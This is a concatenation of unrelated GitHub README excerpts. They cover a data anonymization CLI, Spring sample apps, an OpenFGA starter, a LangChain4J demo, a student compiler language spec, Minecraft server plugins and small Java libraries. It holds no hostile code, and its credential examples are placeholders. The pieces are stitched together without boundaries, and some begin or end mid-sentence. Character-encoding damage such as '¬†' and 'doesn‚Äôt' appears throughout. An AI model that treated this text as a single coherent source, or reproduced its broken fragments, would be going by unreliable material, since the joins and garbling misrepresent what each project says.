-dbe argument is used to supply db dialect. -iid is an optional, yet recommended, option that enables the application to ignore errors and continue processing if it fails to automatically detect the ID column for a specific database table. 
Without this option, the application will generate an error and halt the autodetection process.

or:<br/>
**1b.** Auto-detect data eligible for anonymization using supplied schema name. 

`./dp.sh detect -sn test`

- In this step, the application behaves similarly to the previous one, but instead of relying on a DDL file, it loads schema metadata directly from the database. 
This approach is useful when a DDL file is unavailable. 
- In the provided example, ""test"" represents the name of the schema to be analyzed in the database as defined in the application.properties file.

**1c.** Generate transformation.yaml file manually using transformations.yaml.example as an example using the following pattern:

[schema name]&#58;<br/>
&nbsp;&nbsp;[db table name]:<br/>
&nbsp;&nbsp;&nbsp;&nbsp;anonymizers:<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[column name]: [anonymizer id]<br/>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;...<br/>
&nbsp;&nbsp;...<br/>

**2.** Use the generated file transformation.yaml for actual anonymization of the selected schema:

`./dp.sh transform -tfn transformations.yaml`

marcolenzo/hexagonal-architecture-spring-sample,main,"# Hexagonal Architecture Sample
This is the sample Spring Boot application used to demonstrate how to leverage the Ports and Adapters pattern by Alistair Cockburn in my YouTube video: <link here>

![Hexagonal High Level Diagram](hexagonal%20high%20level.png)

## Overview
The app supports only one use-case: withdrawing money from a bank account with the only rules being that:
* The account number must exist.
* The account balance can never be negative.

### The Business Logic
All the business logic has been placed in the [`eu.marcolenzo.hexagonalarchitecture.core`](src/main/java/eu/marcolenzo/hexagonalarchitecture/core) package. This represents the inner hexagon in the diagram. In this package, we use plain Java and we avoid using frameworks (including Spring) or libraries.

### Ports
The app has only two ports.

The primary port is the [`WithdrawFundsUseCase`](src/main/java/eu/marcolenzo/hexagonalarchitecture/core/usecases/WithdrawFundsUseCase.java) interface that models our use case and raises an exception if the account is unknown or has insufficient funds, which covers our requirements.

This primary port is implemented as part of the business logic as a service class: [`AccountServices`](src/main/java/eu/marcolenzo/hexagonalarchitecture/core/domain/AccountServices.java)

The secondary port is the [`AccountRepository`](src/main/java/eu/marcolenzo/hexagonalarchitecture/core/repositories/AccountRepository.java) interface which allows to interact with a persistence layer. 

### Adapters
[`InMemoryAccountRepository`](src/main/java/eu/marcolenzo/hexagonalarchitecture/persistence/memory/InMemoryAccountRepository.java) and [`AccountRepositoryImpl`](src/main/java/eu/marcolenzo/hexagonalarchitecture/persistence/mongo/AccountRepositoryImpl.java) are two adapters implementing the same [`AccountRepository`](src/main/java/eu/marcolenzo/hexagonalarchitecture/core/repositories/AccountRepository.java) port. They showcase the power of the pattern that allow use to have multiple adapters for the same port.

It is also important to have a look at the [`AccountDocument`](src/main/java/eu/marcolenzo/hexagonalarchitecture/persistence/mongo/AccountDocument.java) class. The properties are identical to our [`Account`](src/main/java/eu/marcolenzo/hexagonalarchitecture/core/domain/Account.java) class, but it is necessary to have distinct documents to avoid that we create a hard dependency between our business logic in the `core` package and the Spring Data framework.

The primary adapter is a simple controller using Spring MVC: [`AccountController`](src/main/java/eu/marcolenzo/hexagonalarchitecture/web/controllers/AccountController.java)

### Configuration
[`DefaultConfiguration`](src/main/java/eu/marcolenzo/hexagonalarchitecture/configuration/DefaultConfiguration.java) and [`LocalConfiguration`](src/main/java/eu/marcolenzo/hexagonalarchitecture/configuration/LocalConfiguration.java) show how to plan different app context configurations for different profiles. When the local profile is active we leverage the in-memory repository instead of the MongoDB one.",0,0,1,MIT,,0.0

## Main Endpoints

### Authentication

- **POST** `/auth/register`: User registration.
- **POST** `/auth/login`: User authentication and JWT generation.

### Movies

- **GET** `/api/v1/movies`: Lists all movies.
- **POST** `/api/v1/movies`: Adds a new movie.
- **GET** `/api/v1/movies/{rid_movie}`: Retrieves details of a specific movie.
- **POST** `/api/v1/ratings`: Adds a review for a movie.

### Streaming

- **GET** `/api/v1/media/hls/{filename}.m3u8`: Streams the video using HLS based on the file name.


### Example of an Authenticated Request with JWT and OAuth2

All routes, except for login and registration, require authentication. The application supports two methods for authenticated requests:

1. **JWT Authentication**: Users can log in with username and password, receiving a JWT token in the response, which is stored as an HTTP-only cookie.
2. **OAuth2 Authentication**: Users can log in via OAuth2 providers (such as GitHub or Google), which returns an authentication cookie upon successful login.

#### JWT Authentication

When logging in with JWT, the server responds with a cookie named `access_token`, containing the JWT token. This cookie will be automatically sent with each request to protected routes.

To access protected routes with JWT authentication, ensure that the `access_token` cookie is included in your request headers. Alternatively, you may manually include the JWT token in the `Authorization` header as shown below.

### Login Request (JWT)

```http
POST /api/login
Content-Type: application/json

{
  ""username"": ""your-username"",
  ""password"": ""your-password""
}
```

### Swagger UI

To see all available endpoints and their descriptions, access Swagger UI:

http://localhost:8080/swagger-ui.html


## Project Structure

- `src/main/java/com/ismael/movies`: Contains the Java classes, including controllers, services, models, and repositories.
- `src/main/resources/templates`: Contains HTML pages rendered by Thymeleaf.
- `src/main/resources/static`: Contains static files like CSS and JavaScript.
- `src/main/resources/application.properties`: Application configuration.

## Security

The application uses **JWT tokens** and **OAuth2** for authentication and authorization. After logging in, the user receives a token or/and a cookie that must be included in the header of all subsequent requests to protected routes.

# What's this ?
It's a program to get internet lyrics.

It gets information about the currently playing media via [MediaController](https://developer.android.google.cn/reference/android/media/session/MediaController) and then gets the lyrics via the Internet, the Finally it pushes the lyrics to [Lyrics Getter](https://github.com/xiaowine/Lyric-Getter).

It's base on [KaguraRinko/StatusBarLyricExt](https://github.com/KaguraRinko/StatusBarLyricExt). But we removed its system detection and added MusixMatch's lyrics source and adapted it to [Lyrics Getter](https://github.com/xiaowine/Lyric-Getter) ! 
(...and...Yes...We also added an icon to it)

# How to use ?
1. You need to make sure that [LyricsGetter Ext](https://github.com/VictorModi/LyricsGetterExt) is checked in your Xposed Manager for [Lyrics Getter](https://github.com/xiaowine/Lyric-Getter) while Lyrics Getter is running properly.

<div style=""display: flex; justify-content: center;"">
    <img src=""https://raw.githubusercontent.com/VictorModi/Lyrics-Getter-Ext/main/img/how2use.jpg"" alt=""h2u"">
</div>

2. Turn on [LyricsGetter Ext](https://github.com/VictorModi/LyricsGetterExt), turn it on and then grant [LyricsGetter Ext](https://github.com/VictorModi/LyricsGetterExt) notification permission, next you need to make sure that `Lyrics Getter Connection Status` is true and then turn on the switch `Enabled`.

<div style=""display: flex; justify-content: center;"">
    <img src=""https://raw.githubusercontent.com/VictorModi/Lyrics-Getter-Ext/main/img/statusTrue.jpg"" alt=""st"">
</div>

3. After clicking `Enable`, you will be taken to the Notification Access privilege management page, next, please grant [LyricsGetter Ext](https://github.com/VictorModi/LyricsGetterExt) Notification Next, please grant [LyricsGetter Ext](https://github.com/VictorModi/LyricsGetterExt) Notification Access privileges, and the service will start automatically after the authorization is completed.

<div style=""display: flex; justify-content: center;"">
    <img src=""https://raw.githubusercontent.com/VictorModi/Lyrics-Getter-Ext/main/img/notificationAccess.jpg"" alt=""na"">
</div>

4. Finally, if you are using more than one music app and one of the apps you are using has been adapted by [Lyrics Getter](https://github.com/xiaowine/Lyric-Getter), the lyrics will be duplicated when you use that music app, to avoid this, please click `Input Ignored Apps Rules`, it will get the rules file from [Lyrics Getter](https://github.com/xiaowine/Lyric-Getter) and add all the apps in the rules file to the ignore list automatically, then you can avoid the problem of repeated lyrics output.

# RiceDB: LSMTree based storage system

RiceDB is a storage system based on a very popular NoSQL architecture, Log-structured merge-trees also known as LSM Trees. This architecture is followed in many DBs like Amazon's DynamoDB, Cassandra, ScyllaDB, RocksDB, etc.

This storage system is designed to offer fast write throughput with decently fast read operations. This can be used in many embedded storage engines because of the simple key-value pair interface.

This application has all the major components that are required in a system like this.
 - Memtable / in-memory store implemented with AVL Trees
 - SSTable file disk storage
 - Sparse Index for each SSTable for fast reads
 - Bloom Filter for optimization
 - Compaction to deal with Tombstone, stale entries
## API Reference

#### Insert a key-value pair

```http
  POST /api/insert

  json => {
    ""key"" : ""youKey"",
    ""value"" : ""yourValue""
  }
```


#### Update a key-value pair

```http
  PUT /api/update

  json => {
    ""key"" : ""youKey"",
    ""value"" : ""yourValue""
  }

    fga_client_request_model_id: ""example-model-id""
  ```

#### `openfga.credentials.method`

- **Description**: Specifies the authentication method to be used for connecting to the OpenFGA API.
- **Possible Values**:
  - `NONE`: No authentication.
  - `API_TOKEN`: Use an API token for authentication.
  - `CLIENT_CREDENTIALS`: Use OAuth2 client credentials for authentication.

#### `openfga.credentials.config.api-token`

- **Description**: The API token used for authenticating requests when the `API_TOKEN` method is selected.
- **Example**: `your-api-token`

#### `openfga.credentials.config.client-id`

- **Description**: The client ID used for OAuth2 authentication when the `CLIENT_CREDENTIALS` method is selected.
- **Example**: `your-client-id`

#### `openfga.credentials.config.client-secret`

- **Description**: The client secret used for OAuth2 authentication when the `CLIENT_CREDENTIALS` method is selected.
- **Example**: `your-client-secret`

#### `openfga.credentials.config.api-token-issuer`

- **Description**: The issuer of the API token used for OAuth2 authentication when the `CLIENT_CREDENTIALS` method is
  selected.
- **Example**: `https://issuer.example.com`

#### `openfga.credentials.config.api-audience`

- **Description**: The audience for the API token used for OAuth2 authentication when the `CLIENT_CREDENTIALS` method is
  selected.
- **Example**: `https://api.example.com`

#### `openfga.credentials.config.scopes`

- **Description**: The scopes required for OAuth2 authentication when the `CLIENT_CREDENTIALS` method is selected.
  Scopes are space-separated.
- **Example**: `read write`

### Using the `fgaClient` bean

Once configured, an `fgaClient` bean is available to be injected into your Spring components:

```java

@Service
public class MyService {

    @Autowired
    private OpenFgaClient fgaClient;
}
```

This can be used to interact with the FGA API, for example to write authorization data:

```java
public Document createDoc(String id) {
    // ...
    ClientWriteRequest writeRequest = new ClientWriteRequest().writes(List.of(new ClientTupleKey()
            .user(String.format(""user:%s"", SecurityContextHolder.getContext().getAuthentication()))
            .relation(""owner"")
            ._object(String.format(""document:%s"", id))));

    try {
        fgaClient.write(writeRequest).get();
    } catch (InterruptedException | ExecutionException | FgaInvalidParameterException e) {
        throw new RuntimeException(""Error writing to FGA"", e);
    }
    // ...
}
```

### Using the `fga` bean

The starter also creates an `fga` bean, which can be used in conjunction with Spring Security's method
security to protect access to resources using FGA:

```java
// Method body will only execute if the FGA check returns true. 403 otherwise.
@PreAuthorize(""@fga.check('document', #docId, 'reader', 'user', authentication?.name)"")
public Document getDocument(@PathVariable String docId) {
    return repository.findById(id);
}
```

You may also omit the user ID, in which case the name of the currently authenticated principal
will be used as the user ID:

```java
// Method body will only execute if the FGA check returns true. 403 otherwise.
@PreAuthorize(""@fga.check('document', #docId, 'reader', 'user')"")
public Document getDocument(@PathVariable String docId) {
    return repository.findById(id);
}
```

## Customize ApiClient and HttpClient Configuration

To customize the `ApiClient` configuration, create a `@Bean` method in your Spring Boot application:

```java
@Bean
public ApiClient apiClient(HttpClient.Builder builder, ObjectMapper mapper) {
    return new ApiClient(httpClientBuilder, objectMapper);
}
```

Similarly, to customize the `HttpClient.Builder`:

```java
@Bean
public HttpClient.Builder httpClientBuilder() {
    return HttpClient.newBuilder()
            .version(Version.HTTP_2);
}
```

jdubois/jdubois-langchain4j-demo,main,"# LangChain4J demo

_Author: [Julien Dubois](https://www.julien-dubois.com)_

## Goal

This is a Spring Boot project that demonstrates how to use LangChain4J to create Java applications using LLMs.

It contains the following demos:

- How to generate an image using Dalle-3.
- How to generate a text using GPT-4o, GPT-4o-mini, Phi-3.5 and tinyllama.
- How to use a chat conversation with memory of the context.
- How to ingest data into a vector database, and use it.
- How LangChain4J's ""Easy RAG"" works, and a complete example using it.

Those demos either run locally (with Docker, using Ollama and Qdrant) or in the cloud (using Azure OpenAI or GitHub Models, and Azure AI Search).

## Slides

2 slide decks are available to detail this demo:

- [An introduction to LangChain4J](LangChain4J%20intro.pdf): a quick overview of LangChain4J
- [EasyRAG with LangChain4J](LangChain4J%20EasyRAG%20demo.pdf): a focus on demos 10 and 11, detailing the RAG pattern with LangChain4J

## Configuration

There are several Spring Boot profiles, so you can test the demos with different configurations, tools and models.

### _Option 1_ : Running in the cloud with Azure

This configuration uses:

- __Chat Model__: Azure OpenAI with gpt-4o
- __Image Model__: Azure OpenAI with dalle-3
- __Embedding model__: Azure OpenAI with text-embedding-ada
- __Embedding store__: Azure AI Search

It is enabled by using the `azure` Spring Boot profile.
One way to do this is to set `spring.profiles.active=azure` in the `src/main/resources/application.properties` file.

To provision the Azure resources, you need to run the `src/main/script/deploy-azure-openai-models.sh` script. It will create the following resources:

- An Azure OpenAI instance, with the necessary OpenAI models for this demo.
- An Azure AI Search instance.

At the end of this script, the following environment variables will be displayed (and stored in the `.env` file), and you will need them to run the application:
- `AZURE_OPENAI_ENDPOINT`: your Azure OpenAI URL endpoint.
- `AZURE_OPENAI_KEY`: your Azure OpenAI API key.
- `AZURE_SEARCH_ENDPOINT`: your Azure AI Search URL endpoint.
- `AZURE_SEARCH_KEY`: your Azure AI Search API key.

### _Option 2_ : Fully local, not very good, but small and fast

This configuration uses:

- __Chat Model__: Ollama with tinyllama
- __Image Model__: Not available
- __Embedding model__: in-memory Java with AllMiniLmL6V2EmbeddingModel
- __Embedding store__: Qdrant

It is enabled by using the `small` Spring Boot profile.
One way to do this is to set `spring.profiles.active=small` in the `src/main/resources/application.properties` file.

To set up the necessary resources, you need to have Docker installed on your machine, and run with Docker Compose the `src/main/docker/docker-compose-small.yml` file.

It will set up:

- An Ollama instance, with the tinyllama model.
- A Qdrant instance. Its Web UI is available at [http://localhost:6333/dashboard](http://localhost:6333/dashboard).

### _Option 3_ : Fully local, not very fast, but with good quality

This configuration uses:

- __Chat Model__: Ollama with Phi 3.5
- __Image Model__: Not available
- __Embedding model__: Ollama with nomic-embed-text
- __Embedding store__: Qdrant

It is enabled by using the `good` Spring Boot profile.
One way to do this is to set `spring.profiles.active=good` in the `src/main/resources/application.properties` file.

This configuration, especially when running inside Docker, requires a good amount of resources (CPU and RAM).
If you run into timeouts, that's because your machine is not powerful enough to run it.

__Improving performance__: if you have GPUs on your machine, Ollama performance can be greatly improved by using them. The easiest way is to install Ollama locally on your machine, and install the
models like in the `src/main/docker/install-ollama-models-good.sh` script.

To set up the necessary resources, you need to have Docker installed on your machine, and run with Docker Compose the `src/main/docker/docker-compose-good.yml` file.

It will set up:

- An Ollama instance, with the phi3.5 and the nomic-embed-text models. Its Web UI is available at [http://localhost:8081/](http://localhost:8081/).
- A Qdrant instance. Its Web UI is available at [http://localhost:6333/dashboard](http://localhost:6333/dashboard).

### _Option 4_ : GitHub Models

GitHub Models are available [here](https://github.com/marketplace/models).

This configuration uses:

- __Chat Model__: GitHub Models with gpt-4o-mini
- __Image Model__: Not available
- __Embedding model__: GitHub Models with text-embedding-3-small
- __Embedding store__: Qdrant

It is enabled by using the `github` Spring Boot profile.
One way to do this is to set `spring.profiles.active=github` in the `src/main/resources/application.properties` file.

To set up the necessary resources, you need to have Docker installed on your machine, and run with Docker Compose the `src/main/docker/docker-compose-github.yml` file.

It will set up:

- A Qdrant instance. Its Web UI is available at [http://localhost:6333/dashboard](http://localhost:6333/dashboard).

For accessing GitHub Models, you'll need an environment variable named `GITHUB_TOKEN` with a GitHub token that grants permission to access the models.

### _Option 5_ : Same as option 3 (""good""), but using Elasticsearch instead of Qdrant as an embedding store

This configuration uses:

- __Chat Model__: Ollama with Phi 3.5
- __Image Model__: Not available
- __Embedding model__: Ollama with nomic-embed-text
- __Embedding store__: Elasticsearch

It is enabled by using the `elasticsearch` Spring Boot profile.
One way to do this is to set `spring.profiles.active=elasticsearch` in the `src/main/resources/application.properties` file.

This configuration, especially when running inside Docker, requires a good amount of resources (CPU and RAM).
If you run into timeouts, that's because your machine is not powerful enough to run it.

__Improving performance__: if you have GPUs on your machine, Ollama performance can be greatly improved by using them. The easiest way is to install Ollama locally on your machine, and install the
models like in the `src/main/docker/install-ollama-models-good.sh` script.

To set up the necessary resources, you need to have Docker installed on your machine, and run with Docker Compose the `src/main/docker/docker-compose-elasticsearch.yml` file.

It will set up:

- An Ollama instance, with the phi3.5 and the nomic-embed-text models.
- An Elasticsearch instance. Its Web UI is available at [http://localhost:8081](http://localhost:8081).

## Running the demos

Once the resources (Azure or local) are configured, you can run the demos using the following command:

```shell
./mvnw spring-boot:run
```

Then you can access the base URL, where you find the Web UI: [http://localhost:8080/](http://localhost:8080/).

The demos are available in the top menu.

MobinaMhr/Compiler-Course-Projects-S2024,main,"# Compiler-Course-Projects-S2024
Introduction to Compiler and Programming Languages Design course projects in the spring semester of the University of Tehran under the supervision of Dr.Tavassoli.

- ## [Documentation](https://github.com/MobinaMhr/Compiler-Course-Projects-S2024/tree/main/Phase-1). FunctionCraft

FunctionCraft is a functional programming language designed for the Introduction to Compiler and Programming Language Design course projects.

### General Structure
Files have a .fl suffix.
Each file contains two parts :
- Declaration of some functions  
- Declaration of main (the entry point of written programs)
There is no global variable in this language.
This code is one sample program written in this language : 
```
    def get_size(i)
        return len(g()[i]);
    end

    def g()
        return [[1, 2]];
    end

    def main()
        puts(get_size(0));
    end
```

- **General Grammar Rules**
¬† - There is a semicolon at the end of each line of code.
¬† - Empty lines have no impact on the execution or output of the program.
¬† The main function comes at the end of the written program.
¬† - after the return statement in each scope, there cannot be another statement.
¬† - Sequence of function declarations does not affect program execution and function calls.

- **Comment Rules**
¬† - single-line comments start with `#`.
¬† - multi-line comments start with `=begin` and ends with `=end`.
```
    =begin
    The code defines a function called main
    that prints ""salam"" to the console.
    It contains comments marked with #,
    which are explanations
    ignored by the compiler
    =end

    def main()
        puts(""salam""); # This is comment
        # This is comment
    end
```

- **Variable and Function Naming Rules**
Variable and function names should contain only small words (a...z), capital words (A...Z), numbers (0...9), and underscore.
Variable and function names should not start with numbers.
Keywords should not be used as variable and function names.
All keywords in FunctionCraft are listed as follows: 

| def | end | main | return |
|----------|----------|----------|----------|
| if | else | elseif | ture |
| false | chop | chomp | push | 
| puts | method | len | pattern |
| match | next | break | loop |
| do | for | in | |

### Function Declaration
- Each function declaration starts with `def`, followed by the function name, and after that, parentheses. If the function has some parameters, it will be in those parentheses. If there is more than one parameter, they will be separated with some commas. 
- The main function has no parameters
- lambda functions are defined without any name. This type of function can be called only in the function in which they were defined.
```
    -> (param1, param2, ...) { function_body }
```
- Lambda functions can be called after being defined. 
```
    -> (arg1, arg2) { return arg1 + arg2; } (1, 2);
```
- Function can return a pointer to a lambda function.
```
    def foo()
        return -> (arg1, arg2) { return arg1 + arg2; };
    end
```
- a function can return no value.

### Function Call
- All functions are called with parentheses. 
- There is a comma between arguments. 
- list arguments are passed by reference, but other types are passed by values.

### Data Types
All primitive data types in FunctionCraft are listed as follows: 
- integer (`int`)
- floating-point number (`float`)
- string (`string`)
- boolean value (`bool`)
- list (`list`)
- function pointer (`fptr`)
String values should be written between two double quotations. ``` ""String"" ```
All list elements have identical data types.
Two-dimensional lists and multi-dimensional lists are allowed in this programming language.
List elements are accessed with indexes.
Function pointers are created with `method` word. ``` method(: function_name) ```
Function pointer calls are just like normal function calls.

### Parameters
There could be default values set to function parameters. Giving value to arguments with default values is optional. 
```
    def f2 (a, [b = 10, c = 20])
        return a + b + c;
    end
```

### Operators
- **Computational Operators**
  Just numbers can be used as operands. These operators are listed as follows(A = 100, B = 10) : 

| Sample | Description | Participation | Operand |
|----------|----------|----------|----------|
| A + B = 110 | Addition | Left | + |
| A - B = 90 | Subtraction | Left | - |
| A * B = 1000 | Multiplication | Left | * |
| A / B = 10 | Division | Left | / |
| -A = -100 | Monofunctional Negative | Right | - |
| A-- | Postfix operand | Left | -- |
| A++ | Postfix operand | Left | ++ |

- **Comparative Operators**
 These operators compare two values with each other, and the result of this comparison is a boolean type. The operands of `<`, `>`, `<=`, `>=` should be `int` or `float` type. These operators are listed as follows : 

| Sample | Description | Participation | Operand |
|----------|----------|----------|----------|
| A < B = false | Less Than | Left | <= or < |
| A > B = true | Greater Than | Left | >= or > |

- **Logical Operators**


- **Append Operator**
- **Assignment Operators**
- **Precedence of Operators**

### Function Pointer
Function pointers are defined using the `method` keyword. Here is an example of a function pointer definition:
```
def f(x)
    return x + 1;
end

def main()
    f_ptr = method(:f);
    a = f_ptr(5);
    puts(a);
end
```

<!-- ### Conditional Statements

### Scoping Rules -->

### Default Functions

#### puts
The `puts` function is used to print the value of a variable. Here is an example of using the `puts` function:
```
def main()
    a = 5;
    puts(a);
end
```

#### push
The `push` function is used to append an element to a list or string. Here is an example of using the `push` function:
```
def main()
    a = [1,2,3];
    push(a, 4);
    puts(a);
end
```

#### len
The `len` function is used to get the length of a list or a string. Here is an example of using the `len` function:
```
def main()
    a = [1,2,3];
    b = len(a);
    puts(b);
end
```

#### chop
The `chop` function is used to remove the last element of a string. Here is an example of using the `chop` function:
```
def main()
    a = ""Hello"";
    chop(a);
    puts(a);
end
```

#### chomp
The `chomp` function is used to remove the newline characters from the string. Here is an example of using the `chomp` function:
```
def main()
    a = ""Hello\n"";
    chomp(a);
    puts(a);
end
```

### Loops
In this programming language, the `do loop` structure is defined. It does not have any conditions, and its scope ends with the `end` keyword.
```
 loop do
 puts(""start"");
 ...
 puts(""end"");
 end
```
- another defined loop structure is `for ... in ...` whose scope ends with the `end` keyword. It is used for `list` and `range` structures. An example of `range` syntax : `(start .. end)`
The `start` and `end` are integer numbers (`int`). The low bound is inclusive, and the high bound is exclusive. 
- `break`, `break if`, `next`, and `next if` structures can appear in `loop do` and `for`.
- The program returns from the current loop by using the `break if` structure if the condition is satisfied and by using the `break` structure with no conditions.
The program executes the next iteration of the loop by using the `next if` structure if the condition is satisfied and by using the `next` structure without condition ons.
```
 list = [1, 2, 3, 4, 5, 6, 7, 8, 9];
 for num in list
 end

 start = 0;
 finish = 9;
 for num in (start..finish)
 next if (num / 2 == 1);
 puts(num);
 end
```

### Pattern Matching Structure
- Similar to the `Switch case` structure, it gets one or more inputs and, based on them, returns one output.
- There should be a conditional statement after each `|` character. After the `=` character, one value appears. If the condition is satisfied, the value is returned.
- There should be an indentation (one `tab` character or four `space` characters) before each condition.
```
    pattern fib(n)
        | (n == 0) = 1
        | (n == 1) = 1
        | (n > 2) = fib(n-1) + fib(n-2)
    ;
    def main
        fib_5 = fib.match(5);
    end
```
- to call a declared pattern, we use `fib_5 = fib.match(5);` syntax.

- ## [Phase-1](https://github.com/MobinaMhr/Compiler-Course-Projects-S2024/tree/main/Phase-1). Lexical and Syntax Analysis

In this phase, we utilized ANTLR4 to perform lexical and syntax analysis for the FunctionCraft language. The result of this process is a parse tree representing the input program.

- ## [Phase-2](https://github.com/MobinaMhr/Compiler-Course-Projects-S2024/tree/main/Phase-2). Name Analysis

In this phase, we generated the abstract syntax tree (AST) from the input program and conducted name analysis for the FunctionCraft language. The outcome of this phase includes any compile-time errors associated with the name analysis.

- ## [Phase-3](https://github.com/MobinaMhr/Compiler-Course-Projects-S2024/tree/main/Phase-3). Type Analysis

In this phase, we conducted type analysis for the FunctionCraft language. This phase produces compile-time errors related to type analysis.

- ## [Phase-4](https://github.com/MobinaMhr/Compiler-Course-Projects-S2024/tree/main/Phase-4). Code Generation

In this phase, we employed the Jasmin library to generate Java bytecode for the FunctionCraft language. The output of this phase is Java bytecode for the input program, which can be executed on the JVM.",0,0,1,MIT,,0.0

[Link to the blog post](https://semyonsinchenko.github.io/ssinchenko/post/extending-spark-connect/)

## Introduction

This project is written to work with a fresh (March, 2024) version of Apache Spark: 4.0.0-SNAPSHOT. There are a lot of reasons for it, it is detailed described inside a blog-post. It is hardly recommended to follow the blog-post text.

## Experiment desing

This repository and the corresponding blog-post is trying to cover the topic of migration of PySpark extensions based on `py4j` to a ""new spark"" with decoupled architecture. Inside the code there is an answer to the question how to interact with JVM classes and objects from Python via SparkConnect protocol.

## Structure

There are four main parts:

1. A JVM library we are trying to call from PySpark via gRPC: [link](https://github.com/SemyonSinchenko/spark-connect-example/tree/master/src/main/java/com/ssinchenko/example/lib);
2. A server-side plugins for SparkConnect written in Java: [linl](https://github.com/SemyonSinchenko/spark-connect-example/tree/master/src/main/java/com/ssinchenko/example/server);
3. A protobuf messages definition: [link](https://github.com/SemyonSinchenko/spark-connect-example/tree/master/src/main/protobuf)
4. A PySpark client part: [link](https://github.com/SemyonSinchenko/spark-connect-example/tree/master/src/main/python)

## Future plans

I will try to improve this `README.md` file, also I'm going to clean the code a little.

Tired of inconsistent knockback ruining your PvP experience? Our plugin recalculates knockback as if it were done clientside, leveling the playing field and ensuring every player enjoys a fair fight, no matter their connection quality.

Minecraft doesn‚Äôt factor in network latency when determining a player's actions on the server. This causes the server to receive outdated information that doesn‚Äôt reflect the player's clientside position, leading to varying knockback effects based on connection quality.

This plugin intercepts and adjusts knockback calculations to match what would occur clientside, effectively mitigating the disadvantages caused by high latency. By synchronizing knockback handling, we ensure that players experience consistent and fair knockback, providing a balanced and competitive environment for all.""

## Frequently Asked Questions (FAQ)

### Does this change put high ping players at a disadvantage?
**It depends on the player.** Some may notice a difference if they're used to relying on high ping to reduce knockback. For others, it could actually be an advantage.

### How does this change benefit high ping players?
**Knockback control.** For example, it will be easier to escape crit chains and punish crit.

### Why was the configurability of ping offset removed?
**It promotes consistency across all servers.** Extensive testing with top players has shown that an offset of 25 provides a balanced experience for everyone.

### How do I change the ping offset?
**You must run a modified build of KnockbackSync.** The variable can be changed inside of the [PlayerData](common/src/main/java/me/caseload/knockbacksync/player/PlayerData.java) class.

## Commands
---
### /knockbacksync ping [target]

**Description:**

This command allows you to check the ping of a player, including jitter. If no target is specified, it will check your own ping.

**Permissions:**

* `knockbacksync.ping` (defaults to true for players)

**Examples:**

* `/knockbacksync ping`: Checks your own ping.
* `/knockbacksync ping Steve`: Checks the ping of a player named Steve.

**Output:**

* If a pong packet has been received:  ""Your last ping packet took [ping]ms. Jitter: [jitter]ms."" or ""[Player]'s last ping packet took [ping]ms. Jitter: [jitter]ms.""
* If a pong packet has not been received: ""Pong not received. Your estimated ping is [estimated ping]ms."" or ""Pong not received. [Player]'s estimated ping is [estimated ping]ms.""

**Notes:**

* The estimated ping is based on the player's platform reported ping.
* Jitter represents the variation in ping over time.

This command allows you to check the KnockbackSync status of a player or the server. If no target is specified, it will show both the global status and your own status.

**Permissions:**

* `knockbacksync.status.self` (defaults to true for players): Allows checking your own status.
* `knockbacksync.status.other` (defaults to op only): Allows checking the status of other players.

**Examples:**

* `/knockbacksync status`: Shows the global status and your own status.
* `/knockbacksync status Steve`: Shows the status of a player named Steve.

**Output:**

* **Global status:** ""Global KnockbackSync status: [Enabled/Disabled]""
* **Player status:** ""[Player]'s KnockbackSync status: [Enabled/Disabled]"" (or ""Disabled (Global toggle is off)"" if the global toggle is off)

**Notes:**

* The player status will be ""Disabled"" if the global toggle is off, even if the player has individually enabled KnockbackSync.
* The messages displayed by this command are configurable in the `config.yml` file.
---
### /knockbacksync toggle [target]

**Description:**

This command allows you to toggle KnockbackSync for yourself, another player, or globally.

**Permissions:**

* `knockbacksync.toggle.self` (defaults to true for players): Allows toggling KnockbackSync for yourself.
* `knockbacksync.toggle.other` (defaults to op only): Allows toggling KnockbackSync for other players.
* `knockbacksync.toggle.global` (defaults to op only): Allows toggling KnockbackSync globally for the server.

**Examples:**

* `/knockbacksync toggle`: Toggles KnockbackSync globally (if you have permission) or for yourself.
* `/knockbacksync toggle Steve`: Toggles KnockbackSync for a player named Steve.

**Output:**

* **Global toggle:** Sends a message indicating whether KnockbackSync has been enabled or disabled globally. The messages are configurable in the `config.yml` file.
* **Player toggle:** Sends a message indicating whether KnockbackSync has been enabled or disabled for the specified player. The messages are configurable in the `config.yml` file.
* **Ineligible player:** If a player is ineligible for KnockbackSync (e.g., due to permissions), a configurable message will be sent.
* **KnockbackSync disabled:** If KnockbackSync is disabled globally and you try to toggle it for a player, a message will be sent indicating that KnockbackSync is disabled.

**Notes:**

* If KnockbackSync is disabled globally, toggling it for a player will have no effect until KnockbackSync is enabled globally.
* Players can only toggle KnockbackSync for themselves if they have the `knockbacksync.toggle.self` permission.
* Operators can toggle KnockbackSync for other players and globally.
---
### /knockbacksync reload

**Description:**

This command reloads the KnockbackSync plugin's configuration file.

**Permissions:**

* `knockbacksync.reload` (defaults to op only)

**Examples:**
* `/knockbacksync reload`

**Output:**

* Sends a message to the command sender indicating that the configuration has been reloaded. The message is configurable in the `config.yml` file.

**Notes:**

* This command is useful for applying changes made to the configuration file without restarting the server.
---
### /knockbacksync toggleoffground

  **Description:**
  
  This command toggles the experimental off-ground knockback synchronization feature.
  
  **Permissions:**
  
  * `knockbacksync.toggleoffground` (defaults to op only)
  
  **Examples:**
  
  * `/knockbacksync toggleoffground`
  
  **Output:**
  
  * Sends a message indicating whether the experimental off-ground knockback synchronization has been enabled or disabled. The messages are configurable in the `config.yml` file.
  
  **Notes:**
    * This feature is experimental and may not work as expected.

Sugar for Java


What is this?
--------------

Sugar is a small utils library providing static functions to write less verbose Java code. 

Nothing groundbreaking here, just some sugar.

Features:
- Create/Manipulate collections: set, list, map, partition, product, intersect, counts, sums
- Collection helpers: first, last, sorted, max, min, mean, sum, prepend, append, concat, zip
- Random: random string, random char, choose elements in collection
- Parallel: pEach, pMap


# Examples

## Collections
```Java
Map<String, String> newMap = map(kv(""key1"", ""value1""), kv(""key1"", ""value1""), kv(""key1"", ""value1""));

List<Integer> values = list(1,2,3,4);
Integer min = min(values);
Integer last = last(values);
Integer one = first(filter(values,v -> v == 1));
values = map(values, v -> v + 1);

Map<Profile, Integer> counts = counts(objects, o -> o.getProfile());

```

## POJOs
```Java
orElse(""test"", s -> s + ""_ok"", null);
ifPresent(""test"", s -> System.out.println(s));
isoDateTime(LocalDateTime.now());
```

This [BungeeCord](https://github.com/SpigotMC/BungeeCord/) (and now [Spigot](https://www.spigotmc.org/wiki/spigot/)
and [Velocity](https://papermc.io/software/velocity/)) plugin enables proxied and direct connections both at the same time. More
